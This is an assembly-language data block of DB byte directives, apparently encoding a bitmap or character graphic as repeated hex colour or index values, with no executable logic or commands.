DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH
DB 01AH,01AH,019H,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH,01CH,00BH
DB 019H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH,014H,018H,019H
DB 019H,019H,019H,019H,019H,01AH,014H,000H,000H,014H,019H,01AH,01AH,01AH,019H
DB 019H,019H,01AH,018H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,016H,01AH,01AH,01AH,019H,019H,01AH,01AH,018H,016H
DB 01CH,003H,017H,019H,01AH,019H,019H,01AH,01AH,019H,014H,01CH,01CH,01CH,01CH
DB 016H,01AH,013H,018H,017H,016H,014H,00BH,003H,01CH,01CH,00BH,017H,01AH,01AH
DB 01AH,019H,01AH,01AH,019H,013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,01AH,01AH,019H
DB 01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH,01CH,00BH,019H,01AH,01AH
DB 019H,019H,01AH,01AH,01AH,013H,013H,01CH,000H,017H,019H,01AH,01AH,019H,019H
DB 019H,019H,017H,01CH,01CH,01CH,01CH,013H,019H,01AH,01AH,019H,019H,01AH,01AH
DB 01AH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,016H,01AH,01AH,01AH,019H,019H,01AH,01AH,019H,016H,01CH,00BH,017H
DB 01AH,01AH,01AH,019H,01AH,01AH,01AH,00BH,01CH,01CH,01CH,01CH,01CH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,017H,01AH,01AH,01AH,019H,01AH
DB 01AH,01AH,013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,01AH,019H,019H,01AH,01AH,01AH
DB 013H,013H,01CH,01CH,01CH,01CH,01CH,01CH,00BH,019H,01AH,01AH,019H,019H,01AH
DB 01AH,01AH,013H,013H,01CH,003H,017H,01AH,01AH,01AH,019H,01AH,01AH,019H,013H
DB 01CH,01CH,01CH,01CH,013H,017H,01AH,01AH,01AH,019H,01AH,01AH,01AH,00BH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,016H
DB 01AH,01AH,01AH,019H,019H,01AH,01AH,018H,016H,01CH,014H,018H,01AH,01AH,01AH
DB 019H,01AH,01AH,017H,00BH,00BH,00BH,00BH,00BH,013H,013H,014H,014H,016H,016H
DB 016H,017H,017H,013H,01CH,00BH,017H,01AH,01AH,01AH,019H,01AH,01AH,01AH,013H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,00BH,013H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH
DB 01CH,01CH,01CH,01CH,01CH,013H,019H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H
DB 013H,01CH,00BH,018H,01AH,01AH,01AH,019H,01AH,01AH,019H,013H,01CH,01CH,01CH
DB 01CH,013H,017H,01AH,01AH,01AH,019H,01AH,01AH,01AH,00BH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,000H,000H,000H,017H,01AH,01AH,01AH
DB 019H,019H,01AH,01AH,018H,016H,01CH,016H,017H,01AH,01AH,01AH,019H,019H,018H
DB 018H,018H,018H,018H,018H,019H,019H,019H,019H,019H,019H,019H,019H,019H,013H
DB 013H,01CH,00BH,017H,01AH,01AH,01AH,019H,01AH,01AH,01AH,013H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 00BH,013H,01AH,01AH,019H,019H,01AH,01AH,01AH,019H,013H,013H,013H,013H,013H
DB 013H,013H,013H,01AH,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,00BH
DB 018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,01CH,01CH,01CH,01CH,013H,017H
DB 01AH,01AH,01AH,019H,01AH,01AH,01AH,00BH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 00BH,00BH,016H,016H,016H,016H,016H,016H,016H,01AH,01AH,01AH,019H,019H,01AH
DB 01AH,018H,016H,01CH,017H,019H,01AH,01AH,01AH,019H,019H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,019H,019H,019H,019H,019H,019H,013H,013H,013H,01CH,00BH
DB 017H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH
DB 01AH,01AH,019H,01AH,01AH,01AH,017H,016H,016H,016H,016H,016H,016H,016H,016H
DB 019H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,00BH,017H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,013H,01CH,01CH,01CH,01CH,013H,017H,01AH,01AH,01AH
DB 019H,01AH,01AH,01AH,00BH,01CH,01CH,01CH,01CH,000H,016H,017H,017H,017H,017H
DB 017H,017H,017H,017H,017H,017H,018H,01AH,019H,019H,019H,01AH,01AH,018H,016H
DB 01CH,016H,018H,01AH,01AH,01AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,019H,019H,019H,019H,013H,019H,013H,01CH,00BH,017H,01AH,01AH
DB 019H,019H,01AH,01AH,01AH,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,01AH,01AH,019H
DB 01AH,01AH,018H,017H,017H,017H,017H,017H,017H,017H,017H,017H,018H,01AH,01AH
DB 019H,019H,01AH,01AH,01AH,013H,013H,01CH,003H,017H,01AH,01AH,01AH,019H,01AH
DB 01AH,01AH,00BH,01CH,01CH,01CH,01CH,003H,017H,01AH,01AH,01AH,019H,019H,01AH
DB 01AH,00BH,01CH,01CH,01CH,003H,017H,018H,018H,018H,018H,018H,019H,019H,019H
DB 019H,019H,019H,019H,019H,019H,019H,019H,01AH,01AH,018H,016H,01CH,00BH,018H
DB 01AH,01AH,01AH,019H,01AH,01AH,019H,014H,014H,014H,014H,014H,017H,019H,01AH
DB 01AH,019H,019H,019H,013H,019H,003H,01CH,00BH,017H,01AH,01AH,019H,019H,019H
DB 019H,019H,017H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,01AH,01AH,019H,019H,019H,019H
DB 019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,01AH,019H,019H,01AH
DB 01AH,01AH,013H,013H,01CH,01CH,017H,019H,01AH,01AH,019H,019H,019H,019H,017H
DB 000H,01CH,01CH,01CH,014H,017H,019H,01AH,01AH,019H,019H,019H,019H,003H,01CH
DB 01CH,000H,018H,019H,018H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H
DB 019H,019H,019H,019H,01AH,01AH,01AH,018H,016H,01CH,00BH,017H,01AH,01AH,01AH
DB 019H,01AH,01AH,01AH,00BH,01CH,01CH,01CH,01CH,00BH,017H,01AH,01AH,01AH,019H
DB 019H,019H,018H,01CH,01CH,00BH,017H,01AH,01AH,019H,019H,019H,019H,019H,017H
DB 00BH,000H,000H,003H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,00BH,013H,01AH,01AH,019H,019H,019H,019H,019H,019H,019H,019H
DB 019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,01AH,01AH,01AH,013H
DB 013H,01CH,01CH,016H,019H,01AH,01AH,01AH,019H,019H,019H,017H,016H,00BH,013H
DB 00BH,016H,018H,019H,01AH,019H,019H,019H,019H,017H,01CH,01CH,01CH,014H,01AH
DB 019H,019H,019H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 019H,019H,01AH,01AH,018H,016H,01CH,01CH,017H,01AH,01AH,01AH,019H,019H,01AH
DB 019H,017H,000H,01CH,01CH,003H,016H,017H,019H,01AH,01AH,019H,019H,019H,017H
DB 01CH,01CH,00BH,017H,01AH,01AH,019H,019H,019H,019H,019H,019H,017H,016H,013H
DB 017H,018H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 00BH,013H,01AH,01AH,019H,019H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH
DB 003H,018H,01AH,01AH,01AH,01AH,019H,019H,018H,017H,017H,016H,017H,017H,019H
DB 019H,019H,019H,019H,01BH,019H,00BH,01CH,01CH,000H,019H,01AH,019H,019H,019H
DB 01AH,01AH,01AH,01AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,019H,019H,019H,01AH
DB 01AH,019H,016H,01CH,01CH,00BH,018H,01AH,01AH,01AH,019H,019H,019H,017H,016H
DB 00BH,00BH,014H,017H,018H,019H,019H,019H,019H,019H,019H,003H,01CH,01CH,00BH
DB 017H,01AH,01AH,019H,019H,019H,01AH,019H,019H,019H,018H,017H,019H,01AH,000H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH
DB 01AH,019H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,00BH,018H
DB 01AH,01AH,01AH,01AH,019H,019H,018H,018H,018H,018H,019H,019H,019H,01AH,01AH
DB 01AH,019H,015H,01CH,01CH,01CH,00BH,01AH,01AH,019H,019H,019H,01AH,01AH,01AH
DB 019H,018H,014H,014H,00BH,017H,01AH,01AH,019H,019H,019H,01AH,01AH,019H,016H
DB 01CH,01CH,000H,017H,019H,01AH,01AH,01AH,019H,019H,018H,018H,017H,017H,017H
DB 018H,019H,019H,01AH,019H,01AH,019H,014H,01CH,01CH,01CH,00BH,017H,01AH,01AH
DB 019H,019H,019H,01AH,019H,019H,019H,019H,019H,019H,01BH,016H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,01AH,01AH,019H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,016H,019H,01AH,01AH
DB 01AH,01AH,019H,019H,019H,019H,019H,019H,01AH,01AH,01AH,01AH,01AH,017H,000H
DB 01CH,01CH,01CH,00BH,01AH,01AH,01AH,019H,01AH,01AH,01AH,019H,017H,000H,01CH
DB 01CH,013H,016H,01AH,01AH,019H,019H,019H,01AH,01AH,018H,016H,01CH,01CH,01CH
DB 003H,018H,019H,01AH,01AH,01AH,01AH,019H,019H,019H,019H,019H,019H,019H,01AH
DB 01AH,01AH,01AH,017H,000H,01CH,01CH,01CH,00BH,017H,01AH,01AH,019H,019H,01AH
DB 01AH,017H,01AH,01AH,01AH,019H,019H,019H,01AH,000H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,01AH,01AH,019H,01AH,01AH,01AH
DB 013H,00BH,00BH,00BH,00BH,00BH,00BH,00BH,016H,019H,01AH,01AH,019H,019H,01AH
DB 01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH,014H,018H,019H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,015H,000H,01CH,01CH,01CH,01CH
DB 016H,01AH,01AH,019H,019H,01AH,01AH,01AH,018H,00BH,01CH,01CH,01CH,013H,016H
DB 01AH,01AH,019H,019H,01AH,01AH,01AH,018H,016H,01CH,01CH,01CH,01CH,003H,018H
DB 019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H
DB 000H,01CH,01CH,01CH,01CH,00BH,017H,01AH,01AH,01AH,01AH,01AH,01AH,018H,019H
DB 01AH,01AH,01AH,01AH,01AH,01AH,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,00BH,013H,01AH,01AH,01AH,019H,01AH,01AH,01AH,013H,013H,013H
DB 013H,013H,013H,013H,013H,00BH,019H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H
DB 013H,01CH,01CH,01CH,01CH,01CH,01CH,003H,015H,019H,019H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,018H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,016H,01AH,01AH
DB 019H,019H,01AH,01AH,01AH,018H,00BH,01CH,01CH,01CH,013H,016H,01AH,01AH,019H
DB 019H,01AH,01AH,01AH,018H,016H,01CH,01CH,01CH,01CH,01CH,01CH,00BH,018H,019H
DB 019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00BH,01CH,01CH,01CH,01CH
DB 01CH,01CH,00BH,019H,01AH,01AH,01AH,01AH,01AH,01AH,016H,017H,019H,01AH,01AH
DB 01AH,01AH,01AH,015H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 00BH,013H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH
DB 01CH,013H,00BH,019H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,00BH,014H,015H,018H,018H,017H,011H,00BH
DB 003H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,01AH,01AH,019H,019H,01AH
DB 01AH,01AH,017H,016H,003H,000H,01CH,013H,016H,01AH,01AH,019H,019H,019H,01AH
DB 01AH,018H,016H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,00BH,014H,017H
DB 018H,018H,017H,015H,014H,003H,013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 00BH,00BH,00BH,00BH,00BH,00BH,00BH,003H,000H,00BH,017H,018H,017H,014H,003H
